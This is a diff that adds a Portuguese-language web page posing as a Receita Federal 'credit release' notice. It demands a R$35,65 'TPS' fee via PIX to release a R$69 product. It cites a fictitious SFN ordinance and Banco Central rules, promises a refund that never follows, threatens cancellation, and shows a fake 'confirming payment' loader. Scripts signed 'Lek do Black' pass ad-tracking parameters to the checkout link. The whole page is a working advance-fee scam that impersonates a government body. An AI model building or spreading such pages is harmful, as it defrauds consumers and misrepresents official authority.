@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Liberação de Crédito - TRF</title>
+  <meta name="description" content="Pague a Taxa de Processamento e Segurança (TPS) para liberar o produto com segurança via checkout.">
+  <link rel="canonical" href="/" />
+  <script 
+        src="https://cdn.jsdelivr.net/gh/xTracky/static/utm-handler.js"
+        data-token="0f3d4318-71de-45ca-a811-a926ff267d83"
+        data-click-id-param="click_id">
+  </script>
+  <script>
+    // Porteiro Fofoqueiro de UTM v1.0 - por Lek do Black
+    (function() {
+      console.log('LEK DO BLACK: Porteiro na atividade, catando UTMs...');
+      try {
+        const urlParams = new URLSearchParams(window.location.search);
+        const utmKeys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'click_id', 'fbclid', 'gclid', 'src', 'sck'];
+        
+        let capturedCount = 0;
+        utmKeys.forEach(key => {
+          const value = urlParams.get(key);
+          if (value) {
+            localStorage.setItem(`utm_${key}`, value);
+            capturedCount++;
+          }
+        });
+        
+        if (capturedCount > 0) {
+          console.log(`LEK DO BLACK: ${capturedCount} UTMs guardadas no bolso.`);
+        } else {
+          console.log('LEK DO BLACK: Nenhuma UTM nova na URL pra guardar.');
+        }
+      } catch (e) {
+        console.error('LEK DO BLACK: Deu merda no porteiro de UTM.', e);
+      }
+    })();
+  </script>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f0f2f5;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .top-bar {
+      width: 100%;
+      background-color: #002C5F;
+      padding: 0.8rem 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .top-bar img {
+      height: 40px;
+    }
+    .container {
+      background: #fff;
+      padding: 1.5rem;
+      max-width: 480px;
+      width: 100%;
+      border-radius: 10px;
+      box-shadow: 0 5px 25px rgba(0,0,0,0.1);
+      margin-top: 1rem;
+    }
+    .logo {
+      display: block;
+      margin: 0 auto 1rem;
+      width: 80px;
+    }
+    .title {
+      font-size: 1.2rem;
+      color: #222;
+      text-align: left;
+      margin-bottom: 0.5rem;
+      font-weight: bold;
+    }
+    .alert {
+      background: #fff3cd;
+      color: #856404;
+      border: 1px solid #ffeeba;
+      padding: 0.6rem 1rem;
+      font-size: 0.9rem;
+      border-radius: 5px;
+      margin-bottom: 1rem;
+    }
+    .info {
+      font-size: 0.95rem;
+      color: #535862;
+      margin-bottom: 1rem;
+      text-align: center;
+    }
+    .resumo {
+      background: #f9f9f9;
+      padding: 1rem;
+      border-radius: 8px;
+      margin-bottom: 1rem;
+    }
+    .resumo div {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 0.5rem;
+      font-size: 0.9rem;
+    }
+    .resumo .total {
+      font-weight: bold;
+      font-size: 1rem;
+      color: #1e88e5;
+    }
+    .garantia, .metodo {
+      background: #eef1f5;
+      padding: 1rem;
+      margin-bottom: 1rem;
+      border-radius: 8px;
+      font-size: 0.9rem;
+      color: #444;
+    }
+    .botao {
+      display: block;
+      width: 100%;
+      background-color: #1e88e5;
+      color: white;
+      text-align: center;
+      padding: 1rem;
+      font-size: 1rem;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      text-decoration: none;
+    }
+    .botao:hover {
+      background-color: #1565c0;
+    }
+    @media (max-width: 480px) {
+      .title {
+        font-size: 1.5rem;
+      }
+      .resumo div {
+        font-size: 0.85rem;
+      }
+      .resumo .total {
+        font-size: 0.95rem;
+      }
+    }
+  .loader-screen {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background: white;
+  display: flex;
+  flex-direction: column;
+  justify-content: flex-end;
+  align-items: flex-start; /* <<< alinhamento à esquerda */
+  padding: 0 20px 100px;
+  z-index: 9999;
+  transition: opacity 1s ease;
+}
+
+ .loader-text {
+  font-size: 1.6rem;
+  font-weight: bold;
+  color: #111;
+  margin-bottom: 20px;
+  min-height: 2.5em;
+  width: 100%;
+  max-width: 400px; /* igual à barra */
+}
+
+  .progress-bar {
+    width: 100%;
+    max-width: 400px;
+    height: 8px;
+    background: #e0e0e0;
+    border-radius: 5px;
+    overflow: hidden;
+    position: relative;
+  }
+
+  .progress-fill {
+    width: 0%;
+    height: 100%;
+    background: #004aad;
+    transition: width 1.5s ease;
+  }
+
+  .fade-in {
+    opacity: 0;
+    transition: opacity 1s ease;
+  }
+
+  .show {
+    opacity: 1;
+  }
+
+  /* Transições de texto */
+  .slide-out-bottom {
+    animation: slideOutBottom 0.5s forwards;
+  }
+
+  .slide-in-top {
+    animation: slideInTop 0.5s forwards;
+  }
+
+  @keyframes slideOutBottom {
+    to {
+      opacity: 0;
+      transform: translateY(40px);
+    }
+  }
+
+  @keyframes slideInTop {
+    from {
+      opacity: 0;
+      transform: translateY(-40px);
+    }
+    to {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+  
+  /* === FAQ Accordion === */
+.faq-container {
+  margin: 2rem 0;
+}
+.faq-container .faq-item + .faq-item {
+  margin-top: 0.5rem;
+}
+.faq-question {
+  width: 100%;
+  padding: 1rem;
+  background: #fff;
+  border: 1px solid #ccc;
+  border-radius: 8px;
+  text-align: left;
+  font-weight: bold;
+  cursor: pointer;
+  transition: background .2s;
+}
+.faq-question.active {
+  background: #f0f0f0;
+}
+.faq-answer {
+  display: none;
+  padding: 1rem;
+  border-left: 3px solid #1e88e5;
+  background: #f9f9f9;
+  border-radius: 0 8px 8px 0;
+  margin-top: 0.25rem;
+  font-size: 0.95rem;
+  color: #444;
+}
+
+  </style>
+</head>
+<body>
+
+  <!-- LOADER -->
+  <div class="loader-screen" id="loader">
+    <div class="loader-text slide-out-bottom" id="loader-text"></div>
+    <div class="progress-bar">
+      <div class="progress-fill" id="progress-fill"></div>
+    </div>
+  </div>
+
+  <!-- CONTEÚDO -->
+  <div id="conteudo" class="fade-in">
+    <div class="top-bar">
+   <svg xmlns="http://www.w3.org/2000/svg" width="160" height="37" viewBox="0 0 160 37" fill="none"><path d="M21.1241 10.7151C21.1241 8.57211 24.1418 6.77896 27.9031 6.77896C31.6643 6.77896 34.682 8.52837 34.682 10.7151C34.682 12.8582 31.6643 14.6076 27.9031 14.6076C24.1418 14.6076 21.1241 12.8582 21.1241 10.7151ZM16.182 10.6277C23.9669 15.1761 33.7636 22.6111 38.7494 26.7222L27.9468 37C20.9054 30.1773 15.0887 24.7979 10.6277 20.9492C13.2518 15.7447 15.1761 12.2459 16.182 10.6277ZM16.0508 4.19858C19.8121 4.19858 23.792 4.37352 27.9468 4.67967C21.0804 7.6974 13.7329 11.7648 5.86052 16.9693C3.7175 15.2199 1.74941 13.8203 0 12.6395C5.81679 9.1844 11.1525 6.38535 16.0508 4.19858ZM40.5863 4.50473L39.7116 10.6277C33.9823 7.12884 27.8156 4.32979 21.1679 2.14303C24.3168 1.04965 26.5473 0.349882 27.9031 0C31.708 0.962175 35.9066 2.49291 40.5863 4.50473ZM27.9468 18.4125C34.4196 13.7329 40.2802 9.9279 46.1844 7.21631C48.8523 8.52837 52.0887 10.3215 55.8499 12.5957C52.0887 15.2199 48.2837 18.1939 44.4787 21.5615C39.2305 20.3369 32.9764 19.156 27.9468 18.4125Z" fill="white"></path><path d="M58.5178 24.9289H61.4481V19.8993C62.4977 19.8993 62.8913 19.8993 63.3724 21.605L64.3346 24.9289H67.3961L66.1277 20.8615C65.6467 19.3745 65.2968 18.8934 64.3783 18.7622C66.7838 18.2374 66.8712 16.1819 66.8712 15.657C66.8712 13.3391 65.1218 12.4644 63.0663 12.4644H58.5178V24.9289ZM61.3169 14.5636H62.1916C63.766 14.5636 63.941 15.6133 63.941 16.1381C63.941 17.0128 63.3724 17.8001 62.2353 17.8001H61.3169V14.5636ZM81.9162 22.9608C81.4351 23.1358 80.954 23.092 80.3854 23.092C79.3795 23.092 78.2424 22.5235 78.2424 20.6866C78.2424 20.3367 78.2424 18.1499 80.2542 18.1499C80.8228 18.1499 81.2164 18.1499 81.785 18.2374L81.9162 16.2693C81.0415 16.1818 80.6916 16.1381 79.8169 16.1381C77.0616 16.1381 75.5308 18.0187 75.5308 20.6866C75.5308 22.261 76.2743 25.0601 79.5982 25.0601C80.4292 25.0601 81.2164 25.1476 81.9599 24.9289L81.9162 22.9608ZM90.3571 14.7823H92.9812V12.4644H90.3571V14.7823ZM134.486 12.4644H131.862V17.5376C131.512 16.7504 130.812 16.1381 129.588 16.1381C127.401 16.1381 126.526 18.0625 126.526 20.3804C126.526 23.1358 127.619 25.0601 129.588 25.0601C131.075 25.0601 131.687 24.0979 131.949 23.5294C131.993 24.1417 132.037 24.579 132.037 24.9289H134.53C134.486 24.5353 134.486 24.0979 134.486 23.0045V12.4644ZM129.325 20.5991C129.325 19.2433 129.413 17.9313 130.593 17.9313C131.643 17.9313 131.906 19.2433 131.906 20.5991C131.906 21.605 131.687 23.1795 130.593 23.1795C129.369 23.1795 129.325 21.5176 129.325 20.5991ZM143.408 24.9289H146.032V21.0802C146.032 19.8119 146.207 18.4998 147.738 18.4998H148.612V16.3131H148.219C146.688 16.3131 146.338 16.9254 145.813 17.8875C145.77 17.3627 145.726 16.8379 145.726 16.3131H143.32C143.364 16.7504 143.364 17.2752 143.364 18.1062V24.9289H143.408ZM157.01 24.9289H159.634V12.4644H157.01V24.9289ZM111.437 24.9289H114.237V19.7244H118.173V17.5376H114.237V14.6511H118.304V12.4644H111.394V24.9289H111.437ZM149.312 18.4561C150.362 18.0187 151.149 17.9313 151.805 17.9313C152.199 17.9313 153.423 17.8438 153.423 19.5057H152.636C151.718 19.5057 148.35 19.5057 148.35 22.436C148.35 24.0105 149.4 25.0601 151.018 25.0601C152.242 25.0601 153.292 24.2729 153.38 23.748L153.467 24.9289H155.872C155.829 24.3603 155.829 23.748 155.829 22.4797V19.3308C155.829 17.4064 155.129 16.1381 152.067 16.1381C151.105 16.1381 150.187 16.2693 149.312 16.2693V18.4561ZM153.423 21.2551C153.423 23.3544 152.111 23.3982 151.849 23.3982C151.63 23.3982 150.712 23.3982 150.712 22.2611C150.712 20.8178 152.374 20.7303 153.423 20.7303V21.2551ZM69.8452 19.8556C69.8452 19.3745 69.8452 17.7126 71.201 17.7126C72.2944 17.7126 72.5568 18.7622 72.5568 19.8556H69.8452ZM74.9185 20.6428C74.9185 16.1381 71.9445 16.1381 71.1573 16.1381C68.6644 16.1381 67.3086 18.2374 67.3086 20.5554C67.3086 23.1795 68.6644 25.0601 71.6821 25.0601C72.5568 25.0601 73.5627 25.1038 74.4374 24.9289L74.3937 22.9608C73.519 23.267 72.863 23.267 71.9445 23.267C70.4575 23.267 69.8015 22.3048 69.8015 21.2989H74.9185V20.6428ZM84.5403 19.8556C84.5403 19.3745 84.5403 17.7126 85.8961 17.7126C86.9895 17.7126 87.2519 18.7622 87.2519 19.8556H84.5403ZM89.6136 20.6428C89.6136 16.1381 86.6396 16.1381 85.8523 16.1381C83.3594 16.1381 82.0036 18.2374 82.0036 20.5554C82.0036 23.1795 83.3594 25.0601 86.3772 25.0601C87.2956 25.0601 88.2578 25.1038 89.1325 24.9289L89.0888 22.9608C88.214 23.267 87.558 23.267 86.6396 23.267C85.1526 23.267 84.4966 22.3048 84.4966 21.2989H89.6136V20.6428ZM120.928 19.8556C120.928 19.3745 120.928 17.7126 122.284 17.7126C123.377 17.7126 123.64 18.7622 123.64 19.8556H120.928ZM126.045 20.6428C126.045 16.1381 123.071 16.1381 122.284 16.1381C119.791 16.1381 118.435 18.2374 118.435 20.5554C118.435 23.1795 119.791 25.0601 122.809 25.0601C123.683 25.0601 124.689 25.1038 125.564 24.9289L125.52 22.9608C124.645 23.267 123.989 23.267 123.071 23.267C121.584 23.267 120.928 22.3048 120.928 21.2989H126.045V20.6428ZM137.635 19.8556C137.635 19.3745 137.635 17.7126 138.991 17.7126C140.084 17.7126 140.346 18.7622 140.346 19.8556H137.635ZM142.752 20.6428C142.752 16.1381 139.778 16.1381 138.991 16.1381C136.498 16.1381 135.142 18.2374 135.142 20.5554C135.142 23.1795 136.498 25.0601 139.515 25.0601C140.434 25.0601 141.396 25.1038 142.271 24.9289L142.227 22.9608C141.352 23.267 140.696 23.267 139.778 23.267C138.291 23.267 137.635 22.3048 137.635 21.2989H142.752V20.6428ZM100.547 18.4561C101.597 18.0187 102.384 17.9313 103.04 17.9313C103.434 17.9313 104.658 17.8438 104.658 19.5057H103.871C102.953 19.5057 99.5852 19.5057 99.5852 22.436C99.5852 24.0105 100.635 25.0601 102.253 25.0601C103.521 25.0601 104.527 24.2729 104.615 23.748L104.702 24.9289H107.108C107.064 24.3603 107.02 23.748 107.02 22.4797V19.3308C107.02 17.4064 106.32 16.1381 103.303 16.1381C102.341 16.1381 101.422 16.2693 100.547 16.2693V18.4561ZM104.658 21.2551C104.658 23.3544 103.346 23.3982 103.084 23.3982C102.865 23.3982 101.947 23.3982 101.947 22.2611C101.947 20.8178 103.609 20.7303 104.615 20.7303V21.2551H104.658ZM90.3571 24.9289V16.2693H94.9055V14.4762L97.4859 13.6452V16.2256H99.1916V18.0625H97.4859V22.0424C97.4859 22.8733 97.8795 23.1358 98.3606 23.1358C98.7105 23.1358 98.9729 23.0483 99.2353 22.9608V24.8852C98.9729 24.9726 98.2731 25.0164 97.3984 25.0164C96.0427 25.0164 94.8618 24.3603 94.8618 22.4797V18.1062H93.0249V24.9289H90.3571Z" fill="white"></path></svg>
+  </div>
+
+  <div class="container">
+    <div class="alert">Taxa de Processamento e Segurança (TPS)</div>
+    <div class="title">Pagamento Obrigatório para Liberação do Produto</div>
+    <p class="info">Para liberar seu produto (Kit de Furadeira Multifuncional 21V Recarregável com 2 Baterias Incluídas) no valor de <strong>R$69,00</strong>, é necessário o pagamento da TPS no valor de <strong>R$35,65</strong>.</p>
+
+<h2 style="font-size: 16px; font-weight:550"><span style="color: #FF0000;">* </span>Antes da liberação, é necessário o recolhimento da TPS — Taxa de Processamento e Segurança — conforme portaria N.º 177/21 do SFN (Sistema Financeiro Nacional).</h2>
+   <div class="resumo" style="background: #fff; border: 1px solid #ccc; padding: 1rem; border-radius: 10px; font-size: 15px;">
+  <h2 style="margin-top: 0; font-size: 20px; font-weight: bold;">Resumo</h2>
+  <hr style="border: none; border-top: 1px solid #ddd; margin: 10px 0;">
+  
+  <div style="display: flex; justify-content: space-between; margin-bottom: 12px;">
+    <span>Valor do produto</span>
+    <strong style="color: #000; font-size: 18px;">R$69,00</strong>
+  </div>
+
+  <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 2px;">
+    <span>Valor a ser pago (TPS)</span>
+    <strong style="color: #D9534F; font-size: 18px;">- R$35,65</strong>
+  </div>
+  <p style="color: #D9534F; font-size: 13px; margin: 4px 0 12px;">
+    *(Reembolsado após Aprovação e Liberação do Produto)
+  </p>
+
+  <hr style="border: none; border-top: 1px solid #ddd; margin: 10px 0;">
+
+  <div style="display: flex; justify-content: space-between; font-weight: bold; font-size: 18px; margin-bottom: 12px;">
+    <span>Valor total do produto</span>
+    <span>R$69,00</span>
+  </div>
+
+  <div style="display: flex; gap: 8px; align-items: start;">
+    <span style="color: #888;">❗</span>
+    <p style="font-size: 14px; color: #444; margin: 0;">
+      O produto no valor de R$69,00 será liberado imediatamente após a confirmação do pagamento.
+    </p>
+  </div>
+</div>
+
+<a class="botao" id="btn-pagar" href="https://pay.nitropaycheckout.com.br/checkout/54bad75f-9cfd-466e-a9e4-609a2a43a789" onclick="return handleCheckoutClick(event)">Pagar Taxa e Liberar Produto</a>
+
+<!-- Garantia de reembolso -->
+<div style="background: #e8f5e8; border: 1px solid #4caf50; border-radius: 10px; padding: 1rem; margin: 1rem 0;">
+  <div style="display: flex; align-items: center; gap: 10px;">
+    <span style="color: #4caf50; font-size: 24px;">🛡️</span>
+    <h3 style="margin: 0; font-size: 18px; font-weight: bold; color: #2e7d32;">Garantia de Reembolso 100%</h3>
+  </div>
+  <hr style="margin: 10px 0; border: none; border-top: 1px solid #4caf50;">
+  <div style="display: flex; gap: 8px;">
+    <span style="color: #4caf50;">✓</span>
+    <p style="margin: 0; font-size: 14px; color: #2e7d32;">
+      <strong>Esta taxa é apenas para processar seu pedido.</strong> O valor de R$35,65 será 100% reembolsado automaticamente após a confirmação da liberação do produto. Processo totalmente seguro e regulamentado.
+    </p>
+  </div>
+</div>
+
+<br><br>
+<!-- Aviso de cancelamento por não pagamento -->
+<div style="background: #fff; border: 1px solid #ccc; border-radius: 10px; padding: 1rem; margin-bottom: 1rem;">
+  <div style="display: flex; align-items: center; gap: 10px;">
+    <span style="font-size: 24px; color: #D9534F;">⚠️</span>
+    <h3 style="margin: 0; font-size: 18px; font-weight: bold; color: #D9534F;">Atenção: pagamento obrigatório</h3>
+  </div>
+  <hr style="margin: 10px 0; border: none; border-top: 1px solid #ddd;">
+  <p style="margin: 0; font-size: 14px; color: #444;">
+    O não pagamento da TPS resultará no cancelamento automático da compra e o produto não será liberado.
+  </p>
+</div>
+
+<!-- Método de pagamento -->
+<div style="background: #fff; border: 1px solid #ccc; border-radius: 10px; padding: 1rem; margin-bottom: 1rem;">
+  <div style="display: flex; align-items: center; gap: 10px;">
+    <img src="images/1200px-Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%252C_2020%29.svg.png" width="120" alt="pix logo"><br>
+  </div>
+  <h3 style="margin: 0 0 8px; font-size: 18px; font-weight: bold;">Método de pagamento</h3>
+  <hr style="margin: 10px 0; border: none; border-top: 1px solid #ddd;">
+  <div style="display: flex; gap: 8px;">
+    <span style="color: #888;">❗</span>
+    <p style="margin: 0; font-size: 14px; color: #444;">
+      Pague com PIX! Os pagamentos são simples, práticos e realizados em segundos.
+    </p>
+  </div>
+  </div>
+
+  <script>
+  const loader = document.getElementById("loader");
+  const progress = document.getElementById("progress-fill");
+  const loaderText = document.getElementById("loader-text");
+  const conteudo = document.getElementById("conteudo");
+
+  const textos = [
+    "Processando produto",
+    "Confirmando pagamento",
+    "Quase lá! Falta apenas um passo..."
+  ];
+
+  const progresso = ["40%", "60%", "90%"];
+
+  let index = 0;
+
+  function trocarTexto() {
+    loaderText.classList.remove("slide-in-top");
+    loaderText.classList.add("slide-out-bottom");
+
+    setTimeout(() => {
+      loaderText.textContent = textos[index];
+      loaderText.classList.remove("slide-out-bottom");
+      loaderText.classList.add("slide-in-top");
+      progress.style.width = progresso[index];
+      index++;
+    }, 400);
+  }
+
+  setTimeout(() => trocarTexto(), 300);
+  setTimeout(() => trocarTexto(), 2000);
+  setTimeout(() => trocarTexto(), 4000);
+
+  setTimeout(() => {
+    loader.style.opacity = "0";
+    conteudo.classList.add("show");
+  }, 6000);
+
+  setTimeout(() => {
+    loader.style.display = "none";
+  }, 6000);
+</script>
+
+<div class="container">  
+  <h2 class="title">Dúvidas Frequentes</h2>
+  <div class="faq-container">
+    <div class="faq-item">
+      <button class="faq-question">
+        Por que a TPS de R$35,65 não é descontada do valor do produto de R$69,00?
+      </button>
+      <div class="faq-answer">
+        Conforme determinação do Banco Central, o pagamento da (TPS) deve ser realizado separadamente para validar a identidade do beneficiário e evitar fraudes. O valor será reembolsado junto com a liberação do produto após a confirmação.
+      </div>
+    </div>
+    <div class="faq-item">
+      <button class="faq-question">
+        Como realizar o pagamento da (TPS)?
+      </button>
+      <div class="faq-answer">
+        Clique no botão <strong>'Pagar Taxa e Liberar Produto'</strong> e siga as instruções para realizar o pagamento via PIX. O processo é rápido e seguro.
+      </div>
+    </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  // fecha todas e abre só a clicada
+  const items = document.querySelectorAll('.faq-item');
+  items.forEach(item => {
+    const q = item.querySelector('.faq-question');
+    const a = item.querySelector('.faq-answer');
+    q.addEventListener('click', () => {
+      // se já aberto, fecha tudo
+      if (q.classList.contains('active')) {
+        items.forEach(i => {
+          i.querySelector('.faq-question').classList.remove('active');
+          i.querySelector('.faq-answer').style.display = 'none';
+        });
+      } else {
+        // fecha todos
+        items.forEach(i => {
+          i.querySelector('.faq-question').classList.remove('active');
+          i.querySelector('.faq-answer').style.display = 'none';
+        });
+        // abre só este
+        q.classList.add('active');
+        a.style.display = 'block';
+      }
+    });
+  });
+</script>
+
+<script>
+  // Despachante de UTM v1.0 - por Lek do Black
+  function handleCheckoutClick(e) {
+    if (e) e.preventDefault();
+    console.log('LEK DO BLACK: Despachante preparando o pacote...');
+    
+    // MUDA SÓ ESSA LINHA, SEU ANIMAL! BOTA O LINK DO CHECKOUT AQUI.
+    const baseUrl = "https://pay.nitropaycheckout.com.br/checkout/54bad75f-9cfd-466e-a9e4-609a2a43a789";
+    
+    let finalUrl = baseUrl;
+
+    const utmKeys = [
+      'utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 
+      'utm_content', 'click_id', 'fbclid', 'gclid', 'src', 'sck'
+    ];
+    
+    const currentUrlParams = new URLSearchParams(window.location.search);
+    const paramsParaAdicionar = new URLSearchParams();
+
+    utmKeys.forEach(key => {
+      let value = currentUrlParams.get(key); // Prioridade 1: URL atual
+      if (!value) {
+        value = localStorage.getItem(`utm_${key}`); // Prioridade 2: Bolso do porteiro
+      }
+      if (value) {
+        paramsParaAdicionar.append(key, value);
+      }
+    });
+
+    const utmString = paramsParaAdicionar.toString();
+
+    if (utmString) {
+      const separator = baseUrl.includes('?') ? '&' : '?';
+      finalUrl = `${baseUrl}${separator}${utmString}`;
+    }
+
+    console.log('LEK DO BLACK: Pacote pronto. Redirecionando pra:', finalUrl);
+    window.location.href = finalUrl;
+    return false;
+  }
+</script>
+
+</div></body></html>
